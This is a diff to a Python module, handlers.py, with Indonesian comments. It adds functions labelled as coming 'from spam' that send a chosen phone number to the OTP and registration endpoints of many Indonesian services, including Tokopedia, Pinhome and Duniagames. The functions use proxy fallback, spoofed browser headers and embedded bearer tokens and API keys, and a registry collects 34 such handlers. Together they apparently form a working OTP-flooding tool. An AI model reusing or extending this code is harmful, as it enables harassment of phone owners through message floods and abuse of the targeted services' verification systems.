@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# handlers.py - Semua fungsi pengirim OTP (FULL 39 HANDLER)
+# handlers.py - Semua fungsi pengirim OTP (FULL 39 HANDLER + 10 API SPAM)
 
 import requests
 import uuid
@@ -9,10 +9,71 @@ import time
 import re
 import urllib.parse
 import json
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua
 from license import RATE_LIMIT_KEYWORDS
+from proxy_manager import proxy_request, get_proxy_request
 
+# ==================== HELPER FUNCTIONS ====================
+def spam_otp_nilai(response, start, end):
+    try:
+        if response is None:
+            return None
+        idx = response.find(start)
+        if idx == -1:
+            return None
+        idx += len(start)
+        tail = response[idx:]
+        end_idx = tail.find(end)
+        if end_idx == -1:
+            return None
+        return tail[:end_idx]
+    except:
+        return None
+
+def format_nomor(nomor):
+    nomor = nomor.strip().replace(" ", "").replace("-", "")
+    if nomor.startswith("0"):
+        phone = "+62" + nomor[1:]
+        username = "0" + nomor[1:]
+    elif nomor.startswith("62"):
+        phone = "+" + nomor
+        username = "0" + nomor[2:]
+    elif nomor.startswith("+62"):
+        phone = nomor
+        username = "0" + nomor[3:]
+    else:
+        phone = "+62" + nomor
+        username = "0" + nomor
+    return phone, username
+
+def safe_request(method, url, **kwargs):
+    """Wrapper untuk request dengan proxy fallback"""
+    try:
+        return proxy_request(method, url, **kwargs)
+    except:
+        try:
+            # Fallback tanpa proxy
+            return requests.request(method, url, **kwargs)
+        except:
+            return None
+
+def get_response_text(resp):
+    """Safe get response text"""
+    if resp is None:
+        return ""
+    try:
+        return resp.text
+    except:
+        return ""
+
+def get_response_status(resp):
+    """Safe get response status"""
+    if resp is None:
+        return None
+    return resp.status_code
+    
 # ==================== HANDLER 1: HRS-BRE ====================
 def send_hrsbre_otp(phone_08):
     BASE_URL = "https://career.hrs-bre.site"
@@ -1135,3 +1196,333 @@ def send_ptsp_kemenag_otp(phone_08):
         return resp
     except:
         return None
+
+# ==================== HANDLER 26: ADIRAKU (DARI SPAM) ====================
+def send_adiraku_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            nomor_lokal = "0" + phone_number[2:]
+        else:
+            nomor_lokal = phone_number
+        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
+        headers = {"Content-Type": "application/json; charset=utf-8"}
+        payload = {"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}
+        resp = requests.post(url, json=payload, headers=headers, timeout=15)
+        return spam_otp_nilai(resp.text, '{"message":"', '","') == "success"
+    except:
+        return False
+
+# ==================== HANDLER 27: TOKOPEDIA (DARI SPAM) ====================
+def send_tokopedia_otp(phone_number):
+    try:
+        session = requests.Session()
+        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_number}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        resp = session.get(url_token, headers=headers, timeout=10)
+        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
+        if not token:
+            return False
+        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
+        data = {
+            "otp_type": "116",
+            "msisdn": phone_number,
+            "tk": token.group(1),
+            "email": "",
+            "original_param": "",
+            "user_id": "",
+            "signature": "",
+            "number_otp_digit": "6"
+        }
+        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+        headers["X-Requested-With"] = "XMLHttpRequest"
+        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
+        return resp2.status_code == 200
+    except:
+        return False
+
+# ==================== HANDLER 28: SINGA (DARI SPAM) ====================
+def send_singa_otp(phone_number):
+    try:
+        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
+        payload = {"mobile_phone": phone_number, "type": "mobile", "is_switchable": 1}
+        headers = {"Content-Type": "application/json; charset=utf-8"}
+        res = requests.post(url, json=payload, headers=headers, timeout=10)
+        return spam_otp_nilai(res.text, '"msg":"', '","') == "Success"
+    except:
+        return False
+
+# ==================== HANDLER 29: PINHOME V2 (DARI SPAM) ====================
+def send_pinhome_v2_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            nomor_lokal = "0" + phone_number[2:]
+        else:
+            nomor_lokal = phone_number
+        url = "https://www.pinhome.id/api/pinaccount/request/otp"
+        headers = {
+            "Host": "www.pinhome.id",
+            "Accept": "application/json",
+            "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+            "Origin": "https://www.pinhome.id"
+        }
+        payload = {
+            "accountType": "customers",
+            "countryCode": "62",
+            "medium": "whatsapp",
+            "otpType": "register",
+            "phoneNumber": nomor_lokal
+        }
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code < 400
+    except:
+        return False
+
+# ==================== HANDLER 30: DUNIAGAMES V2 (DARI SPAM) ====================
+def send_duniagames_v2_otp(phone_number):
+    try:
+        phone, username = format_nomor(phone_number)
+        session = requests.Session()
+        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
+        headers = {
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "id",
+            "ciam-type": "FR",
+            "content-type": "application/json",
+            "origin": "https://duniagames.co.id",
+            "referer": "https://duniagames.co.id/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "Android",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"
+        }
+        payload = {"phoneNumber": phone, "userName": username}
+        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code == 200
+    except:
+        return False
+
+# ==================== HANDLER 31: ACC (DARI SPAM) ====================
+def send_acc_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            nomor_lokal = "0" + phone_number[2:]
+        else:
+            nomor_lokal = phone_number
+
+        session = requests.Session()
+
+        url = "https://www.acc.co.id/register/new-account"
+
+        headers = {
+            "Accept": "text/x-component",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Connection": "keep-alive",
+            "Content-Type": "text/plain;charset=UTF-8",
+            "Host": "www.acc.co.id",
+            "next-action": "7f4271400eb36624563cc4172891e0c821039f2fca",
+            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%5D%7D%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%2Cnull%2Ctrue%5D",
+            "Origin": "https://www.acc.co.id",
+            "Referer": "https://www.acc.co.id/register/new-account",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "Android",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+        }
+
+        payload = f'[{{"user_id":null,"action":"register","send_to":"{nomor_lokal}","provider":"whatsapp"}}]'
+
+        resp = session.post(url, data=payload, headers=headers, timeout=10)
+        return resp.status_code == 200
+    except:
+        return False
+
+# ==================== HANDLER 32: ABSENKU (DARI SPAM) ====================
+def send_absenku_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            phone_number = "0" + phone_number[2:]
+
+        session = requests.Session()
+
+        session.get(
+            "https://registrasi.absenku.com/index.php/register/index/2",
+            headers={
+                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            },
+            timeout=10
+        )
+
+        headers = {
+            "accept": "*/*",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "content-type": "application/x-www-form-urlencoded",
+            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest",
+        }
+
+        session.post(
+            "https://registrasi.absenku.com/index.php/register/validasi_trial",
+            data={
+                "nama": "Nama Lengkap",
+                "email": "email@gmail.com",
+                "telp": phone_number,
+                "company_name": "PT Test",
+                "jumlah": "10",
+                "tujuan": "1",
+                "paket": "21",
+                "ci_csrf_token": ""
+            },
+            headers=headers,
+            timeout=10
+        )
+
+        resp = session.get(
+            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
+            params={"telp": phone_number},
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+    except:
+        return False
+
+# ==================== HANDLER 33: SATURDAYS (DARI SPAM) ====================
+def send_saturdays_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            nomor_lokal = "0" + phone_number[2:]
+        else:
+            nomor_lokal = phone_number
+
+        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
+
+        headers = {
+            "accept": "*/*",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "authorization": "undefined",
+            "content-type": "application/json",
+            "country-code": "ID",
+            "currency-code": "IDR",
+            "device-type": "mweb",
+            "origin": "https://saturdays.com",
+            "referer": "https://saturdays.com/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": "Android",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "platform": "mweb",
+            "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
+        }
+
+        payload = {
+            "number": nomor_lokal,
+            "country_code": "+62",
+            "type": ""
+        }
+
+        resp = requests.post(url, json=payload, headers=headers, timeout=10)
+        return resp.status_code == 200
+
+    except:
+        return False
+
+# ==================== HANDLER 34: MAULAGI V2 (DARI SPAM) ====================
+def send_maulagi_v2_otp(phone_number):
+    try:
+        if phone_number.startswith("62"):
+            phone_number = "0" + phone_number[2:]
+
+        session = requests.Session()
+
+        headers = {
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "content-type": "application/json",
+            "origin": "https://maulagi.id",
+            "referer": "https://maulagi.id/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-ml-key": "E32VCHXX32"
+        }
+
+        resp = session.post(
+            "https://api.maulagi.id/api/v2/auth/check",
+            json={"credentials": phone_number},
+            headers=headers,
+            timeout=10
+        )
+
+        return resp.status_code < 400
+    except:
+        return False
+
+# ==================== ALL HANDLERS ====================
+ALL_HANDLERS = {
+    'hrsbre': send_hrsbre_otp,
+    'erafone': send_erafone_otp,
+    'planetban': send_planetban_otp,
+    'tuneup': send_tuneup_otp,
+    'hashmicro': send_hashmicro_otp,
+    'klook': send_klook_otp,
+    'internetrakyat': send_internetrakyat_otp,
+    'ultramilk': send_ultramilk_register,
+    'kaniva': send_kaniva_otp,
+    'jembatani': send_jembatani_otp,
+    'rcx': send_rcx_otp,
+    'sahabatteknisi': send_sahabatteknisi_otp,
+    'auto2000': send_auto2000_otp,
+    'astra_daihatsu': send_astra_daihatsu_otp,
+    'royal_canin': send_royal_canin_otp,
+    'watsons': send_watsons_otp,
+    '99co': send_99co_otp,
+    'belirumahco': send_belirumah_otp,
+    'fastworkid': send_fastwork_otp,
+    'beautyhaul': send_beautyhaul_otp,
+    'hainaya': send_hainaya_otp,
+    'minumyukkaka': send_minumyukkaka_otp,
+    'sidemang': send_sidemang_otp,
+    'lapormasbup': send_lapormasbup_otp,
+    'ptspkemenag': send_ptsp_kemenag_otp,
+    'adiraku': send_adiraku_otp,
+    'tokopedia': send_tokopedia_otp,
+    'singa': send_singa_otp,
+    'pinhome_v2': send_pinhome_v2_otp,
+    'duniagames_v2': send_duniagames_v2_otp,
+    'acc': send_acc_otp,
+    'absenku': send_absenku_otp,
+    'saturdays': send_saturdays_otp,
+    'maulagi_v2': send_maulagi_v2_otp,
+}
+
+def get_all_handlers():
+    return ALL_HANDLERS
+
+def get_handler(name):
+    return ALL_HANDLERS.get(name)
